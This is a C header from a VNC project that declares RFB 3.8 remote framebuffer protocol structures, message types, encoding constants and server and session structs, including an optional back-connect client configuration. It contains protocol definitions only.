//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: rfb.h
// $Revision: 137 $
// $Date: 2013-07-23 16:57:05 +0400 (Вт, 23 июл 2013) $
// description:
//	Lightweight RFB (Remote FrameBuffer) 3.8 protocol implementation.

#ifndef __RFB_H_
#define __RFB_H_

#ifdef _BC_CLIENT
 #include "..\bcclient\bcclient.h"
#endif

#define	RFB_DEFAULT_SERVER_PORT		5900
#define	RFB_DEFAULT_VIEWER_PORT		5500

#define	RFB_CONNECT_ATTEMPTS		5		// number of unsuccessfull connect attempts to a BC-server
#define	RFB_WAIT_BC_TIMEOUT			10*1000	// milliseconds
#define	RFB_WAIT_THREAD_TIMEOUT		


#define	szRfbVersion	"RFB 003.008\n"

// Define the CARD* types as used in X11/Xmd.h
typedef unsigned long CARD32;
typedef unsigned short CARD16;
typedef short INT16;
typedef unsigned char  CARD8;

typedef enum _RFB_AUTH_TYPE
{
	RFB_AUTH_FAILED = 0,
	RFB_AUTH_NONE,
	RFB_AUTH_VNC
} RFB_AUTH_TYPE;

typedef enum _RFB_SECURITY_RESULT
{
	RFB_SECURITY_OK = 0,
	RFB_SECURITY_FAILED = 1
} RFB_SECURITY_RESULT;


#pragma pack(push)
#pragma pack(1)

typedef	struct _RFB_AUTHENTICATION
{
	RFB_AUTH_TYPE	AuthType;
} RFB_AUTHENTICATION, *PRFB_AUTHENTICATION;

//the server and client must agree on the
//type of security to be used on the connection.
typedef	struct _RFB_AUTHENTICATION_V38
{
	CARD8 AuthNum;
	CARD8 AuthType; //none
} RFB_AUTHENTICATION_V38, *PRFB_AUTHENTICATION_V38;

// If the server listed at least one valid security type supported by the client, the
// client sends back a single byte indicating which security type is to be used on
// the connection
typedef	struct _RFB_CLIENT_AUTH_V38
{
	CARD8 AuthType; //none
} RFB_CLIENT_AUTH_V38, *PRFB_CLIENT_AUTH_V38;

// The server sends a word to inform the client whether the security handshaking was
// successful.
typedef	struct _RFB_SECURITY_RESULT_V38
{
	CARD32 Result; //security result = RFB_SECURITY_RESULT
} RFB_SECURITY_RESULT_V38, *PRFB_SECURITY_RESULT_V38;

typedef	struct _RFB_CLIENT_INIT
{
	//	Shared-flag is non-zero (true) if the server should try to share the desktop by leaving
	//	other clients connected, zero (false) if it should give exclusive access to this client by
	//	disconnecting all other clients.
	CARD8	SharedFlag;
} RFB_CLIENT_INIT, *PRFB_CLIENT_INIT;

#pragma warning( push )
#pragma warning( disable : 4200 )
typedef struct _RFB_SERVER_INIT
{
	//	The width of the server’s framebuffer.
	CARD16			FramebufferWidth;

	//	The height of the server’s framebuffer.
	CARD16			FramebufferHeight;

	//	ServerPixelFormat specifies the server’s natural pixel format. This pixel format will
	//	be used unless the client requests a different format using the SetPixelFormatmessage
	PIXEL_FORMAT	ServerPixelFormat;

	//	The name associated with the desktop.
	CARD32			NameLength;
	CARD8			Name[0];
} RFB_SERVER_INIT, *PRFB_SERVER_INIT;
#pragma warning( pop )

// ---- Client to server messages -------------------------------------------------------------------------------------

typedef	enum _RFB_CLIENT_MESSAGE_TYPE
{
	RfbSetPixelFormat = 0,
	RfbFixColourMapEntries,
	RfbSetEncodings,
	RfbFramebufferUpdateRequest,
	RfbKeyEvent,
	RfbPointerEvent,
	RfbClientCutText
} _RFB_CLIENT_MESSAGE_TYPE;

typedef	enum _RFB_ENCODING
{
	RfbEncodingRAW	= 0,
	RfbEncodingCopyRect,
	RfbEncodingRRE,
	RfbEncodingCoRRE,	
	RfbEncodingHextile = 5,
	RfbEncodingZlib = 6,
	RfbEncodingTight = 7,
	RfbEncodingZlibHex = 8,
	RfbEncodingTRLE = 15,
	RfbEncodingZRLE = 16,
	// nyama/2006/08/02:new YUV-Wavlet lossy codec based on ZRLE
	RfbEncodingZYWRLE  =17,

	// Cache & XOR-Zlib - rdv@2002
	RfbEncodingCache					= 0xFFFF0000,
	RfbEncodingCacheEnable				= 0xFFFF0001,
	RfbEncodingXOR_Zlib					= 0xFFFF0002,
	RfbEncodingXORMonoColor_Zlib		= 0xFFFF0003,
	RfbEncodingXORMultiColor_Zlib		= 0xFFFF0004,
	RfbEncodingSolidColor				= 0xFFFF0005,
	RfbEncodingXOREnable				= 0xFFFF0006,
	RfbEncodingCacheZip					= 0xFFFF0007,
	RfbEncodingSolMonoZip				= 0xFFFF0008,
	RfbEncodingUltraZip					= 0xFFFF0009,

	// viewer requests server state updates
	RfbEncodingServerState				= 0xFFFF8000,
	RfbEncodingEnableKeepAlive			= 0xFFFF8001,
	RfbEncodingFTProtocolVersion		= 0xFFFF8002,
	RfbEncodingpseudoSession			= 0xFFFF8003,

	// Same encoder number as in tight 
	/*
	#define rfbEncodingXCursor         0xFFFFFF10
	#define rfbEncodingRichCursor      0xFFFFFF11
	#define rfbEncodingNewFBSize       0xFFFFFF21
	*/

	/*
	 *  Tight Special encoding numbers:
	 *   0xFFFFFF00 .. 0xFFFFFF0F -- encoding-specific compression levels;
	 *   0xFFFFFF10 .. 0xFFFFFF1F -- mouse cursor shape data;
	 *   0xFFFFFF20 .. 0xFFFFFF2F -- various protocol extensions;
	 *   0xFFFFFF30 .. 0xFFFFFFDF -- not allocated yet;
	 *   0xFFFFFFE0 .. 0xFFFFFFEF -- quality level for JPEG compressor;
	 *   0xFFFFFFF0 .. 0xFFFFFFFF -- cross-encoding compression levels.
	 */

	RfbEncodingCompressLevel0  = 0xFFFFFF00,
	RfbEncodingCompressLevel1  = 0xFFFFFF01,
	RfbEncodingCompressLevel2  = 0xFFFFFF02,
	RfbEncodingCompressLevel3  = 0xFFFFFF03,
	RfbEncodingCompressLevel4  = 0xFFFFFF04,
	RfbEncodingCompressLevel5  = 0xFFFFFF05,
	RfbEncodingCompressLevel6  = 0xFFFFFF06,
	RfbEncodingCompressLevel7  = 0xFFFFFF07,
	RfbEncodingCompressLevel8  = 0xFFFFFF08,
	RfbEncodingCompressLevel9  = 0xFFFFFF09,

	RfbEncodingXCursor         = 0xFFFFFF10,
	RfbEncodingRichCursor      = 0xFFFFFF11,
	RfbEncodingPointerPos      = 0xFFFFFF18,
	RfbEncodingLastRect        = 0xFFFFFF20,
	RfbEncodingNewFBSize       = 0xFFFFFF21,
 
	RfbEncodingQualityLevel0   = 0xFFFFFFE0,
	RfbEncodingQualityLevel1   = 0xFFFFFFE1,
	RfbEncodingQualityLevel2   = 0xFFFFFFE2,
	RfbEncodingQualityLevel3   = 0xFFFFFFE3,
	RfbEncodingQualityLevel4   = 0xFFFFFFE4,
	RfbEncodingQualityLevel5   = 0xFFFFFFE5,
	RfbEncodingQualityLevel6   = 0xFFFFFFE6,
	RfbEncodingQualityLevel7   = 0xFFFFFFE7,
	RfbEncodingQualityLevel8   = 0xFFFFFFE8,
	RfbEncodingQualityLevel9   = 0xFFFFFFE9,

	// adzm - 2010-07 - Extended clipboard support
	RfbEncodingExtendedClipboard = 0xC0A1E5CE
} RFB_ENCODING;


// Sets the format in which pixel values should be sent in FramebufferUpdatemessages.
typedef struct	_RFB_MSG_SET_PIXEL_FORMAT
{
	CARD8			MessageType;	// Must be RfbSetPixelFormat
	CARD8			Padding[3];
	PIXEL_FORMAT	PixelFormat;
} RFB_MSG_SET_PIXEL_FORMAT, *PRFB_MSG_SET_PIXEL_FORMAT;


//	Sets the encoding types in which pixel data can be sent by the server. The order of the
//	encoding types given in this message is a hint by the client as to its preference (the first
//	encoding specified being most preferred). The server may or may not choose to make
//	use of this hint. Pixel data may always be sent in raw encoding even if not specified
//	explicitly here.
#pragma warning( push )
#pragma warning( disable : 4200 )
typedef	struct	_RFB_MSG_SET_ENCODINGS
{
	CARD8			MessageType;	// Must be RfbSetEncodings
	CARD8			Padding;
	CARD16			NumberOfEncodings;
	RFB_ENCODING	Encoding[0];
} RFB_MSG_SET_ENCODINGS, *PRFB_MSG_SET_ENCODINGS;
#pragma warning( pop )

//	Notifies the server that the client is interested in the area of the framebuffer specified
//	x-position, y-position, width and height. The server usually responds to a Framebuffer-
//	UpdateRequest by sending a FramebufferUpdate. Note however that a single FramebufferUpdatemay
//	be sent in reply to several FramebufferUpdateRequests.
typedef	struct	_RFB_MSG_FRAMEBUFFER_UPDATE_REQUEST
{
	CARD8			MessageType;	// Must be RfbFramebufferUpdateRequest
	CARD8			Incremental;
	CARD16			XPosition;
	CARD16			YPosition;
	CARD16			Width;
	CARD16			Height;
} RFB_MSG_FRAMEBUFFER_UPDATE_REQUEST, *PRFB_MSG_FRAMEBUFFER_UPDATE_REQUEST;


//	A key press or release message.
typedef struct _RFB_MSG_KEY_EVENT
{
	CARD8			MessageType;	// Must be RfbKeyEvent

	//	Down-flag is non-zero (true) if the key is now pressed, zero (false) if it is now released.
	CARD8			DownFlag;
	CARD16			Padding;

	//	For most ordinary keys this is the same as the corresponding ASCII value.
	//	Other common key values are defined in vnc.h.
	CARD32			Key;
} RFB_MSG_KEY_EVENT, *PRFB_MSG_KEY_EVENT;


//	Indicates either pointer movement or a pointer button press or release. The pointer is
//	now at (x-position, y-position), and the current state of buttons 1 to 8 are represented
//	by bits 0 to 7 of button-mask respectively, 0 meaning up, 1 meaning down (pressed).
typedef struct _RFB_MSG_POINTER_EVENT
{
	CARD8			MessageType;	// Must be RfbPointerEvent
	CARD8			ButtonMask;
	CARD16			XPosition;
	CARD16			YPosition;
} RFB_MSG_POINTER_EVENT, *PRFB_MSG_POINTER_EVENT;

#define rfbButton1Mask 1
#define rfbButton2Mask 2
#define rfbButton3Mask 4
#define rfbButton4Mask 8
#define rfbButton5Mask 16
#define rfbWheelUpMask rfbButton4Mask    // RealVNC 335 method
#define rfbWheelDownMask rfbButton5Mask


//	The client has new ASCII text in its cut buffer. End of lines are represented by the
//	linefeed / newline character (ASCII value 10) alone. No carriage-return (ASCII value 13) is needed.

#pragma warning( push )
#pragma warning( disable : 4200 )
typedef	struct	_RFB_MSG_CLIENT_CUT_TEXT
{
	CARD8			MessageType;	// Must be RfbClientCutText
	CARD8			Padding[3];
	CARD32			Length;
	CARD8			Text[0];
} RFB_MSG_CLIENT_CUT_TEXT, *PRFB_MSG_CLIENT_CUT_TEXT;
#pragma warning( pop )


// ---- Server to client messages ----------------------------------------------------------------------------------

typedef	enum _RFB_SERVER_MESSAGE_TYPE
{
	RfbFramebufferUpdate = 0,
	RfbSetColourMapEntries = 1,
	RfbBell = 2,
	RfbServerCutText = 3
} RFB_SERVER_MESSAGE_TYPE;

/*-----------------------------------------------------------------------------
 * Structure used to specify a rectangle.  This structure is a multiple of 4
 * bytes so that it can be interspersed with 32-bit pixel data without
 * affecting alignment.
 */

typedef struct _RFB_RECTANGLE{
	CARD16 x;
	CARD16 y;
	CARD16 w;
	CARD16 h;
} RFB_RECTANGLE,*PRFB_RECTANGLE;

#define sz_rfbRectangle 8

/*-----------------------------------------------------------------------------

/*
 * Each rectangle of pixel data consists of a header describing the position
 * and size of the rectangle and a type word describing the encoding of the
 * pixel data, followed finally by the pixel data.  Note that if the client has
 * not sent a SetEncodings message then it will only receive raw pixel data.
 * Also note again that this structure is a multiple of 4 bytes.
 */

typedef struct _RFB_FRAMEBUFFER_UPDATE_RECT_HEADER{
	RFB_RECTANGLE Rect;
	CARD32 Encoding;	/* one of the encoding types rfbEncoding... */
} RFB_FRAMEBUFFER_UPDATE_RECT_HEADER,*PRFB_FRAMEBUFFER_UPDATE_RECT_HEADER;

#define sz_rfbFramebufferUpdateRectHeader (sz_rfbRectangle + 4)

/*
* FramebufferUpdate - a block of rectangles to be copied to the framebuffer.
*
* This message consists of a header giving the number of rectangles of pixel
* data followed by the rectangles themselves.  The header is padded so that
* together with the type byte it is an exact multiple of 4 bytes (to help
																  * with alignment of 32-bit pixels):
*/

typedef	struct _RFB_MSG_FRAMEBUFFER_UPDATE
{
	CARD8			MessageType;	// Must be RfbFramebufferUpdate
	CARD8			Padding;
	CARD16			NumberOfRectangles; //	NumberOfRectangles rectangles of pixel data

	//encoded rectangles
	//RFB_FRAMEBUFFER_UPDATE_RECT_HEADER	Rectangle[1];
} RFB_MSG_FRAMEBUFFER_UPDATE, *PRFB_MSG_FRAMEBUFFER_UPDATE;

#define sz_rfbFramebufferUpdateMsg 4

// ---- Rectangle encodings ----------------------------------------------------------------------------------

/*- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 * Raw Encoding.  Pixels are sent in top-to-bottom scanline order,
 * left-to-right within a scanline with no padding in between.
 */


/*- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 * CopyRect Encoding.  The pixels are specified simply by the x and y position
 * of the source rectangle.
 */

typedef struct _RFB_COPY_RECT{
	CARD16 srcX;
	CARD16 srcY;
} RFB_COPY_RECT,*PRFB_COPY_RECT;

#define sz_rfbCopyRect 4

/*- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 * RRE - Rise-and-Run-length Encoding.  We have an rfbRREHeader structure
 * giving the number of subrectangles following.  Finally the data follows in
 * the form [<bgpixel><subrect><subrect>...] where each <subrect> is
 * [<pixel><rfbRectangle>].
 */

typedef struct _RFB_RRE_HEADER{
	CARD32 nSubrects;
} RFB_RRE_HEADER,*PRFB_RRE_HEADER;

#define sz_rfbRREHeader 4

/*- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 * CoRRE - Compact RRE Encoding.  We have an rfbRREHeader structure giving
 * the number of subrectangles following.  Finally the data follows in the form
 * [<bgpixel><subrect><subrect>...] where each <subrect> is
 * [<pixel><rfbCoRRERectangle>].  This means that
 * the whole rectangle must be at most 255x255 pixels.
 */

typedef struct _RFB_CORRE_RECTANGLE{
	CARD8 x;
	CARD8 y;
	CARD8 w;
	CARD8 h;
} RFB_CORRE_RECTANGLE,*PRFB_CORRE_RECTANGLE;

#define sz_rfbCoRRERectangle 4

/*- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 * Hextile Encoding.  The rectangle is divided up into "tiles" of 16x16 pixels,
 * starting at the top left going in left-to-right, top-to-bottom order.  If
 * the width of the rectangle is not an exact multiple of 16 then the width of
 * the last tile in each row will be correspondingly smaller.  Similarly if the
 * height is not an exact multiple of 16 then the height of each tile in the
 * final row will also be smaller.  Each tile begins with a "subencoding" type
 * byte, which is a mask made up of a number of bits.  If the Raw bit is set
 * then the other bits are irrelevant; w*h pixel values follow (where w and h
 * are the width and height of the tile).  Otherwise the tile is encoded in a
 * similar way to RRE, except that the position and size of each subrectangle
 * can be specified in just two bytes.  The other bits in the mask are as
 * follows:
 *
 * BackgroundSpecified - if set, a pixel value follows which specifies
 *    the background colour for this tile.  The first non-raw tile in a
 *    rectangle must have this bit set.  If this bit isn't set then the
 *    background is the same as the last tile.
 *
 * ForegroundSpecified - if set, a pixel value follows which specifies
 *    the foreground colour to be used for all subrectangles in this tile.
 *    If this bit is set then the SubrectsColoured bit must be zero.
 *
 * AnySubrects - if set, a single byte follows giving the number of
 *    subrectangles following.  If not set, there are no subrectangles (i.e.
 *    the whole tile is just solid background colour).
 *
 * SubrectsColoured - if set then each subrectangle is preceded by a pixel
 *    value giving the colour of that subrectangle.  If not set, all
 *    subrectangles are the same colour, the foreground colour;  if the
 *    ForegroundSpecified bit wasn't set then the foreground is the same as
 *    the last tile.
 *
 * The position and size of each subrectangle is specified in two bytes.  The
 * Pack macros below can be used to generate the two bytes from x, y, w, h,
 * and the Extract macros can be used to extract the x, y, w, h values from
 * the two bytes.
 */

#define rfbHextileRaw			(1 << 0)
#define rfbHextileBackgroundSpecified	(1 << 1)
#define rfbHextileForegroundSpecified	(1 << 2)
#define rfbHextileAnySubrects		(1 << 3)
#define rfbHextileSubrectsColoured	(1 << 4)

#define rfbHextilePackXY(x,y) (((x) << 4) | (y))
#define rfbHextilePackWH(w,h) ((((w)-1) << 4) | ((h)-1))
#define rfbHextileExtractX(byte) ((byte) >> 4)
#define rfbHextileExtractY(byte) ((byte) & 0xf)
#define rfbHextileExtractW(byte) (((byte) >> 4) + 1)
#define rfbHextileExtractH(byte) (((byte) & 0xf) + 1)

/*- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 * ZLIB - zlib compression Encoding.  We have an rfbZlibHeader structure
 * giving the number of bytes to follow.  Finally the data follows in
 * zlib compressed format.
 */

typedef struct _RFB_ZLIB_HEADER{
    CARD32 nBytes;
} RFB_ZLIB_HEADER,*PRFB_ZLIB_HEADER;

#define sz_rfbZlibHeader 4

/*- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 * ZRLE - encoding combining Zlib compression, tiling, palettisation and
 * run-length encoding.
 */

typedef struct _RFB_ZRLE_HEADER{
    CARD32 length;
} RFB_ZRLE_HEADER,*PRFB_ZRLE_HEADER;

#define sz_rfbZRLEHeader 4

#define rfbZRLETileWidth 64
#define rfbZRLETileHeight 64

/*- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 * ZLIBHEX - zlib compressed Hextile Encoding.  Essentially, this is the
 * hextile encoding with zlib compression on the tiles that can not be
 * efficiently encoded with one of the other hextile subencodings.  The
 * new zlib subencoding uses two bytes to specify the length of the
 * compressed tile and then the compressed data follows.  As with the
 * raw sub-encoding, the zlib subencoding invalidates the other
 * values, if they are also set.
 */

#define rfbHextileZlibRaw		(1 << 5)
#define rfbHextileZlibHex		(1 << 6)
#define rfbHextileZlibMono		(1 << 7)

#pragma warning( push )
#pragma warning( disable : 4200 )
typedef	struct _RFB_MSG_SERVER_CUT_TEXT
{
	CARD8			MessageType;	// Must be RfbServerCutText
	CARD8			Padding[3];
	CARD32			Length;
	CARD8			Text[0];
} RFB_MSG_SERVER_CUT_TEXT, *PRFB_MSG_SERVER_CUT_TEXT;
#pragma warning( pop )

/*-----------------------------------------------------------------------------
 * SetColourMapEntries - these messages are only sent if the pixel
 * format uses a "colour map" (i.e. trueColour false) and the client has not
 * fixed the entire colour map using FixColourMapEntries.  In addition they
 * will only start being sent after the client has sent its first
 * FramebufferUpdateRequest.  So if the client always tells the server to use
 * trueColour then it never needs to process this type of message.
 */

typedef struct _RFB_MSG_SET_COLOUR_MAP_ENTRIES{
    CARD8 type;			/* always rfbSetColourMapEntries */
    CARD8 pad;
    CARD16 firstColour;
    CARD16 nColours;

    /* Followed by nColours * 3 * CARD16
       r1, g1, b1, r2, g2, b2, r3, g3, b3, ..., rn, bn, gn */

} RFB_MSG_SET_COLOUR_MAP_ENTRIES,*PRFB_MSG_SET_COLOUR_MAP_ENTRIES;

#define sz_rfbSetColourMapEntriesMsg 6

#pragma pack(pop)


// RFB server main structure
typedef struct _RFB_SERVER
{
#if _DEBUG
	ULONG	Magic;
#endif
	LIST_ENTRY			SessionListHead;
	CRITICAL_SECTION	SessionListLock;
#ifdef _BC_CLIENT
	BC_CONNECTION_PAIR	BcPair;
	LPTSTR				pClientId;
#endif

	HANDLE				hShutdownEvent;
	HANDLE				hReadyEvent;

	SOCKADDR_IN			ServerAddress;

	HANDLE				hControlThread;
	ULONG				ControlThreadId;
	ULONG				ConnectTimeout;		// milliseconds

	SOCKET				ControlSocket;

	// for sync
	WINERROR			LastError;
} RFB_SERVER, *PRFB_SERVER;

#define	RFB_SERVER_MAGIC		'rSfR'
#define	ASSERT_RFB_SERVER(x)	ASSERT(x->Magic == RFB_SERVER_MAGIC)


typedef struct	_RFB_SESSION
{
#if _DEBUG
	ULONG			Magic;
#endif

	//	Global session list entry
	LIST_ENTRY		Entry;

	// Pointer to the corresponding VNC session structure.
	PVNC_SESSION	VncSession;

	// Pointer to the RFB server this session belongs to 
	PRFB_SERVER		pServer;

	//	Worker thread handle.
	HANDLE			hThread;

	//	Session socket.
	SOCKET			sSocket;

	//	Session complete status.
	WINERROR		Status;

	// session send lock
	CRITICAL_SECTION SendLock;

	// pixel formats
	PIXEL_FORMAT LocalPixelFormat; // server pixel format
	PIXEL_FORMAT PixelFormat; // client pixel format
	PIXEL_FORMAT TranslatePixelFormat; // translation pixel format
	char *LocalPalette;
	PVOID	Transfunc;			// Translator function
	char*	Transtable;			// Colour translation LUT

	// encodings
	int preferredEncoding;
	BOOL UseCopyRect;
	BOOL enableLastRectEncoding;

	int zlibCompressLevel;
	int tightCompressLevel;
	int tightQualityLevel;
	int zywrleLevel;

	// zrle stream
	HANDLE hZrle;

//#define UPDATE_BUF_SIZE 4*1460*6/2 // see kip settings, buffer should be TCP_SND_BUF/2
	#define UPDATE_BUF_SIZE 8*0x1000 //8k

	/**
	* UPDATE_BUF_SIZE must be big enough to send at least one whole line of the
	* framebuffer.  So for a max screen width of say 2K with 32-bit pixels this
	* means 8K minimum.
	*/
	BYTE UpdateBuf[UPDATE_BUF_SIZE];
	int UpdateBufLen;

} RFB_SESSION, *PRFB_SESSION;

#define	RFB_SESSION_MAGIC		'sSfR'
#define	ASSERT_RFB_SESSION(x)	ASSERT(x->Magic == RFB_SESSION_MAGIC)


//---- functions ---------------------------------------------------------------------------------------------------

WINERROR RfbStartup(PRFB_SERVER	pServer);
VOID RfbCleanup(PRFB_SERVER	pServer);

BOOL RfbSendFramebufferUpdate(PRFB_SESSION RfbSession,int nRects,LPRECT pRectangles);
WINERROR RfbSendServerText(PRFB_SESSION RfbSession, char *Text, LONG Length);
BOOL RfbSendUpdateBuf(PRFB_SESSION RfbSession);
BOOL RfbSendPalette(PRFB_SESSION RfbSession);

#define Swap16IfLE(s) \
	((CARD16) ((((s) & 0xff) << 8) | (((s) >> 8) & 0xff)))
#define Swap32IfLE(l) \
	((CARD32) ((((l) & 0xff000000) >> 24) | \
	(((l) & 0x00ff0000) >> 8)  | \
	(((l) & 0x0000ff00) << 8)  | \
	(((l) & 0x000000ff) << 24)))

// unconditional swaps
#define Swap16(s) \
	((CARD16) ((((s) & 0xff) << 8) | (((s) >> 8) & 0xff)))
#define Swap32(l) \
	((CARD32) ((((l) & 0xff000000) >> 24) | \
	(((l) & 0x00ff0000) >> 8)  | \
	(((l) & 0x0000ff00) << 8)  | \
	(((l) & 0x000000ff) << 24)))


#endif //__RFB_H_